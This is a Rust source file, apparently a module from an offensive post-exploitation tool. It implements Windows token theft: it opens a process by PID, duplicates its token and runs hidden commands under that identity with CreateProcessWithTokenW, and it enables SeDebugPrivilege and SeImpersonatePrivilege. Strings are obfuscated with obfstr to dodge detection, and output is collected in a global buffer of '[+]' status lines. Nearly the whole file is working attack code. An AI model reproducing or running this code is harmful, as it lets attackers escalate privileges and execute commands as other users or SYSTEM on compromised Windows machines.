use core::time;
use std::thread;
use std::io::Error;
use windows_sys::Win32::Security::{SECURITY_ATTRIBUTES, InitializeSecurityDescriptor, TOKEN_QUERY, TOKEN_DUPLICATE, SECURITY_DESCRIPTOR};
use windows_sys::Win32::System::Environment::{CreateEnvironmentBlock, DestroyEnvironmentBlock};
use windows_sys::Win32::System::SystemInformation::GetSystemDirectoryW;
use windows_sys::Win32::System::SystemServices::{SECURITY_DESCRIPTOR_REVISION, SE_IMPERSONATE_NAME};
use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;
use std::ffi::c_void;
use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, FALSE, STILL_ACTIVE, MAX_PATH};
use windows_sys::Win32::Storage::FileSystem::ReadFile;
use std::ptr::null_mut;
use obfstr::obfstr;
use windows_sys::Win32::System::Pipes::{CreatePipe};
use windows_sys::{Win32::{Foundation::{HANDLE, CloseHandle}, Security::{SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, LookupPrivilegeValueW, AdjustTokenPrivileges, TOKEN_PRIVILEGES, DuplicateTokenEx, SecurityImpersonation, TokenPrimary, SecurityDelegation, SecurityAnonymous, SecurityIdentification}}, core::PWSTR};
use windows_sys::Win32::System::{Threading::{PROCESS_QUERY_INFORMATION, CreateProcessWithTokenW, STARTUPINFOW, PROCESS_INFORMATION}, SystemServices::{SE_DEBUG_NAME, MAXIMUM_ALLOWED, SECURITY_MANDATORY_LOW_RID, SECURITY_MANDATORY_MEDIUM_RID, SECURITY_MANDATORY_HIGH_RID, SECURITY_MANDATORY_SYSTEM_RID, SECURITY_MANDATORY_UNTRUSTED_RID, SECURITY_MANDATORY_PROTECTED_PROCESS_RID}};
use windows_sys::Win32::System::Threading::{OpenProcess, OpenProcessToken, GetCurrentProcess, GetExitCodeProcess, LOGON_WITH_PROFILE, STARTF_USESTDHANDLES, STARTF_USESHOWWINDOW, CREATE_NO_WINDOW, CREATE_UNICODE_ENVIRONMENT};

use crate::imputils::{FIXED_SECURITY_MANDATORY_MEDIUM_PLUS_RID, Token, get_token_user_info};
use crate::TOK;

#[repr(i32)]
pub enum ImpersonationLevel {
    Impersonation   = SecurityImpersonation,
    Delegation      = SecurityDelegation,
    Anonymous       = SecurityAnonymous,
    Identification  = SecurityIdentification,
}

impl ImpersonationLevel {
    pub fn display_str(&self) -> &'static str {
        match self {
            ImpersonationLevel::Impersonation   => "Impersonation",
            ImpersonationLevel::Delegation      => "Delegation",
            ImpersonationLevel::Anonymous       => "Anonymous",
            ImpersonationLevel::Identification  => "Identification",
        }
    }
}

#[repr(i32)]
pub enum IntegrityLevel {
    Untrusted        = SECURITY_MANDATORY_UNTRUSTED_RID,
    Low              = SECURITY_MANDATORY_LOW_RID,
    Medium           = SECURITY_MANDATORY_MEDIUM_RID,
    MediumPlus       = FIXED_SECURITY_MANDATORY_MEDIUM_PLUS_RID,
    High             = SECURITY_MANDATORY_HIGH_RID,
    System           = SECURITY_MANDATORY_SYSTEM_RID,
    ProtectedProcess = SECURITY_MANDATORY_PROTECTED_PROCESS_RID,
}

impl IntegrityLevel {
    pub fn display_str(&self) -> &'static str {
        match self {
            IntegrityLevel::Untrusted           => "Untrusted",
            IntegrityLevel::Low                 => "Low",
            IntegrityLevel::Medium              => "Medium",
            IntegrityLevel::MediumPlus          => "MediumPlus",
            IntegrityLevel::High                => "High",
            IntegrityLevel::System              => "System",
            IntegrityLevel::ProtectedProcess    => "ProtectedProcess",
        }
    }
}

/// Function to impersonate process from PID and execute commande
pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {

    unsafe {
        let mut token_handle: HANDLE = std::mem::zeroed();
        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if process_handle == INVALID_HANDLE_VALUE || process_handle == 0 {
            CloseHandle(process_handle);
            return Err(format!("{} Error: {}",obfstr!("OpenProcess"), Error::last_os_error()).to_owned());
        }

        if OpenProcessToken(process_handle,  TOKEN_DUPLICATE | TOKEN_QUERY, &mut token_handle) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            return Err(format!("{} Error: {}",obfstr!("OpenProcessToken"), Error::last_os_error()).to_owned());
        };

        let mut token = Token {
            handle: token_handle,
            username: "".to_owned(),
            process_id: pid,
            process_name: "".to_owned(),
            session_id: 0,
            token_impersonation: ImpersonationLevel::Anonymous,
            token_integrity: IntegrityLevel::Untrusted,
            token_type: 0,
        };

        if let Ok(_) = get_token_user_info(&mut token){
            TOK.push(format!("[+] Impersonating: {}\n", &token.username));
        }

        let mut duplicate_token_handle: HANDLE = std::mem::zeroed();
        if DuplicateTokenEx(token_handle, MAXIMUM_ALLOWED, null_mut(), SecurityDelegation, TokenPrimary, &mut duplicate_token_handle) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("DuplicateTokenEx"), Error::last_os_error()).to_owned());
        };

        TOK.push(format!("[+] Token successfully duplicated\n"));

        let mut sa : SECURITY_ATTRIBUTES = std::mem::zeroed::<SECURITY_ATTRIBUTES>();
        let mut sd : SECURITY_DESCRIPTOR = std::mem::zeroed::<SECURITY_DESCRIPTOR>();

        if InitializeSecurityDescriptor(&mut sd as *mut _ as *mut _, SECURITY_DESCRIPTOR_REVISION) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("InitializeSecurityDescriptor"), Error::last_os_error()).to_owned());
        }

        TOK.push(format!("[+] SECURITY_DESCRIPTOR initialized\n"));

        sa.lpSecurityDescriptor = &mut sd as *mut _ as *mut _;

        TOK.push(format!("[+] SECURITY_ATTRIBUTES initialized\n"));

        let mut read_pipe: HANDLE = std::mem::zeroed::<HANDLE>();
        let mut write_pipe: HANDLE = std::mem::zeroed::<HANDLE>();
    
        if CreatePipe(&mut read_pipe, &mut write_pipe, &sa, 0) == FALSE {
            return Err(format!("{} Error: {}",obfstr!("CreatePipe"), Error::last_os_error()).to_owned());
        }; 

        let mut environment_block = null_mut();

        if CreateEnvironmentBlock(
            &mut environment_block,
            token_handle,
            FALSE,
        ) == FALSE {
            return Err(format!("{} Error: {}",obfstr!("CreateEnvironmentBlock"), Error::last_os_error()).to_owned());
        }

        let mut si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.hStdOutput = write_pipe;
        si.hStdError = write_pipe;
        si.lpDesktop = "WinSta0\\Default\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr();
        si.wShowWindow = SW_HIDE as u16;

        let mut working_dir = Vec::with_capacity(MAX_PATH as usize);
        GetSystemDirectoryW(working_dir.as_mut_ptr(), MAX_PATH);

        let mut cmd = (format!("{}",command).to_owned() + " & echo --------------------\0").encode_utf16().collect::<Vec<u16>>();

        TOK.push(format!("[+] Command to be executed: {}\n", command));

        if CreateProcessWithTokenW(
            duplicate_token_handle,
            LOGON_WITH_PROFILE,
            null_mut(),
            cmd.as_mut_ptr() as *mut _ as PWSTR,
            CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
            environment_block,
            working_dir.as_ptr(),
            &si,
            &mut pi
        ) == 0 {
            CloseHandle(process_handle);
            CloseHandle(read_pipe);
            CloseHandle(write_pipe);
            CloseHandle(token_handle);
            DestroyEnvironmentBlock(environment_block);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("CreateProcessWithTokenW"), Error::last_os_error()).to_owned());
        }

        TOK.push(format!("[+] Process created with id: {}\n", pi.dwProcessId));

        // Read command line return
        let mut bytes_read:u32 = 0;
        let mut buffer_read = vec![0u8;16384];
        thread::sleep(time::Duration::from_millis(500));

        let mut exit_code = 0u32;
        let now = std::time::SystemTime::now();
        loop {
            GetExitCodeProcess(pi.hProcess, &mut exit_code);
            if exit_code as i32 != STILL_ACTIVE {
                break;
            }
            if now.elapsed().unwrap() >= std::time::Duration::from_secs(30) {
                CloseHandle(process_handle);
                CloseHandle(token_handle);
                CloseHandle(read_pipe);
                CloseHandle(write_pipe);
                DestroyEnvironmentBlock(environment_block);
                CloseHandle(duplicate_token_handle);
                return Err(format!("{}",obfstr!("Process timed out")).to_owned());
            }
            thread::sleep(time::Duration::from_millis(500));
        }

        if exit_code != 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(read_pipe);
            CloseHandle(write_pipe);
            DestroyEnvironmentBlock(environment_block);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} {}: {}",obfstr!("Process spawned finish with"), exit_code, Error::last_os_error()).to_owned());
        }

        if ReadFile(read_pipe, buffer_read.as_mut_ptr() as *mut c_void, buffer_read.len() as u32, &mut bytes_read, null_mut())  == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(read_pipe);
            CloseHandle(write_pipe);
            DestroyEnvironmentBlock(environment_block);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("ReadFile"), Error::last_os_error()).to_owned());
        }
        TOK.push(format!("[+] Impersonated command output:\n\n {}",String::from_utf8_lossy(&mut buffer_read[..(bytes_read as usize)])));

        CloseHandle(process_handle);
        CloseHandle(read_pipe);
        CloseHandle(write_pipe);
        CloseHandle(token_handle);
        DestroyEnvironmentBlock(environment_block);
        CloseHandle(duplicate_token_handle);

        return Ok(true)
    }
}

/// Function to enable Windows Privileges SeDebugPrivilege and SeAssignPrimaryToken
pub fn se_priv_enable() -> Result<bool, String>{
    unsafe {

        let mut token_handle:HANDLE = std::mem::zeroed();
        let mut privilege: TOKEN_PRIVILEGES = std::mem::zeroed();
        privilege.PrivilegeCount = 1;
        privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token_handle) == 0 {
            return Err(format!("{} Error: {}",obfstr!("OpenProcessToken"), Error::last_os_error()).to_owned());
        }

        if LookupPrivilegeValueW(null_mut(), SE_DEBUG_NAME, &mut privilege.Privileges[0].Luid) == 0 {
            return Err(format!("{} Error: {}",obfstr!("LookupPrivilegeValueW"), Error::last_os_error()).to_owned());
        }

        if AdjustTokenPrivileges(token_handle as HANDLE, 0, &mut privilege, std::mem::size_of_val(&privilege) as u32, null_mut(), null_mut()) == 0 {
            return Err(format!("{} Error: {}",obfstr!("AdjustTokenPrivileges"), Error::last_os_error()).to_owned());
        }

        if CloseHandle(token_handle as HANDLE) == 0 {
            return Err(format!("{} Error: {}",obfstr!("CloseHandle"), Error::last_os_error()).to_owned());
        }


        // Enable SeImpersonatePrivilege

        let mut token_handle:HANDLE = std::mem::zeroed();
        let mut privilege: TOKEN_PRIVILEGES = std::mem::zeroed();
        privilege.PrivilegeCount = 1;
        privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token_handle) == 0 {
            return Err(format!("{} Error: {}",obfstr!("OpenProcessToken"), Error::last_os_error()).to_owned());
        }

        if LookupPrivilegeValueW(null_mut(), SE_IMPERSONATE_NAME, &mut privilege.Privileges[0].Luid) == 0 {
            return Err(format!("{} Error: {}",obfstr!("LookupPrivilegeValueW"), Error::last_os_error()).to_owned());
        }

        if AdjustTokenPrivileges(token_handle as HANDLE, 0, &mut privilege, std::mem::size_of_val(&privilege) as u32, null_mut(), null_mut()) == 0 {
            return Err(format!("{} Error: {}",obfstr!("AdjustTokenPrivileges"), Error::last_os_error()).to_owned());
        }

        if CloseHandle(token_handle as HANDLE) == 0 {
            return Err(format!("{} Error: {}",obfstr!("CloseHandle"), Error::last_os_error()).to_owned());
        }

        return Ok(true);
    }
}